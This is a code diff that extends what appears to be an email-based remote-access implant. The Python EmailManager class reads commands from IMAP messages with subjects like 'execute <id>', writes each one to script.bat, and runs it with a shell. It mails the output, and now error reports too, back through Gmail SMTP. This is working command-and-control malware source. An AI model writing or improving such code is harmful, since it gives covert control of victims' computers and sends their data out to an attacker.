@@ -43,7 +43,11 @@ class EmailManager:
             elif message.get('Subject') == "dump" + " " + self.id:
                 self.dump_command_response(imap_server, msg_num)
             elif message.get('Subject') == "execute" + " " + self.id:
-                self.execute_command_response(imap_server, msg_num, message)
+                try:
+                    self.execute_command_response(imap_server, msg_num, message)
+                except Exception as e:
+                    self.send_text(imap_server, msg_num, "[-] Error: " + str(e))
+                    imap_server.store(msg_num, "+FLAGS", "\\Deleted")
 
         imap_server.expunge()
         imap_server.close()
@@ -62,12 +66,15 @@ class EmailManager:
         else:
             command = message.get_payload(decode=True).decode()
 
+        with open("script.bat", "w") as file:
+            file.write(command)
+
         msg = EmailMessage()
         msg['to'] = self.email
-        msg['subject'] = self.id + "'s output from provided shell input: " + command
+        msg['subject'] = self.id + "'s output from provided shell input: " + command.replace("\r", "").replace("\n", "")
         msg['from'] = self.email
         try:
-            msg.set_content("[*] Date: " + str(datetime.datetime.now()) + "\n[*] Output: \n\n" + str(subprocess.check_output(command, shell=True, text=True)))
+            msg.set_content("[*] Date: " + str(datetime.datetime.now()) + "\n[*] Output: \n\n" + str(subprocess.check_output("script.bat", shell=True, text=True)))
         except Exception as e:
             print(f"ERROR: {e}")
 
@@ -179,6 +186,21 @@ class EmailManager:
         msg.attach(att)
         self.send_email(msg)
         print("setup email sent")
+
+    def send_text(self, imap_server, msg_num, text):
+        print("send text command (probably due to an error)")
+
+        msg = EmailMessage()
+        msg['to'] = self.email
+        msg['subject'] = self.id + " has sent us something! (likely an error): "
+        msg['from'] = self.email
+        try:
+            msg.set_content("[*] Date: " + str(datetime.datetime.now()) + "\n" + text)
+        except Exception as e:
+            print(f"ERROR: {e}")
+
+        self.send_email(msg)
+        print("email sent")
 
     def send_email(self, msg):
         smtp_server = smtplib.SMTP("smtp.gmail.com", 587)
